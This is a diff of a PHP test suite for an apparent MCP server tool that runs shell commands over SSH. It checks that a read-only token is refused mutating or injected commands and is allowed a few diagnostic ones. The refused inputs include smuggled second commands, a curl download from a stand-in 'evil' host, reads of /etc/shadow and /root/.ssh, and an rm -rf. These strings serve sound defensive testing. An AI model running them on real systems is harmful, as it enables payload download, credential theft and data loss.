@@ -232,7 +232,7 @@ class McpServerTest extends TestCase
         $this->server();
         $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');
 
-        foreach (['systemctl restart nginx', 'ls; curl http://evil -o /tmp/x', "ls\ncurl http://evil -o /tmp/x", 'ls | sh', 'ls || id', 'cat /etc/shadow', 'ls -la /root/.ssh', 'whoami && id', 'ls $(id)'] as $command) {
+        foreach (['systemctl restart nginx', 'date -s 2020-01-01', 'ip route add 10.0.0.0/8 dev lo', 'ps aux; rm -rf /tmp/x', 'ls; curl http://evil -o /tmp/x', "ls\ncurl http://evil -o /tmp/x", 'ls | sh', 'ls || id', 'cat /etc/shadow', 'ls -la /root/.ssh', 'whoami && id', 'ls $(id)'] as $command) {
             $this->callTool($plain, 'run_command', ['command' => $command])
                 ->assertJsonPath('result.isError', true);
         }
@@ -251,6 +251,21 @@ class McpServerTest extends TestCase
 
         $this->callTool($plain, 'run_command', ['command' => 'journalctl -u nginx -n 50 | grep error'])
             ->assertJsonPath('result.isError', false);
+    }
+
+    public function test_read_only_token_may_run_extra_diagnostics(): void
+    {
+        [$plain] = $this->issueToken('read');
+        $this->server();
+        $this->mock(SshClientService::class)
+            ->shouldReceive('executeOnServer')
+            ->times(3)
+            ->andReturn(['output' => 'ok', 'error_output' => '', 'exit_code' => 0]);
+
+        foreach (['ps aux --sort=-%mem | head -20', 'systemctl show mariadb --property=MemoryCurrent', 'du -sh /var/www'] as $command) {
+            $this->callTool($plain, 'run_command', ['command' => $command])
+                ->assertJsonPath('result.isError', false);
+        }
     }
 
     public function test_full_token_runs_mutating_command_with_recorded_approval(): void
